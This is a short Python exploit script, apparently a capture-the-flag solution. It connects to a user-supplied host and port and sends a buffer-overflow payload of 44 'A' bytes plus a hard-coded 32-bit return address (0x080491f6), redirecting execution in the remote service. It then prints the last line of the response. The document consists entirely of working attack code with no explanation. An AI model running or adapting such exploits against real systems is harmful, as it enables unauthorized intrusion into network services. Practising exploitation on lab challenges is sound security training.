import socket
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('host', type=str)
parser.add_argument('port', type=int)


def create_payload(prefixed_amount: int, bytestr: bytes = b'') -> bytes:
    return b'A' * prefixed_amount + bytestr


def connect(host: str, port: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(4096)
    s.send(create_payload(44, b'\xf6\x91\x04\x08') + b'\n')
    ret = s.recv(4096)
    print(ret.decode('utf-8').split('\n')[-1])
    s.close()


if __name__ == '__main__':
    args = parser.parse_args()
    host = args.host
    port = args.port
    connect(host, port)
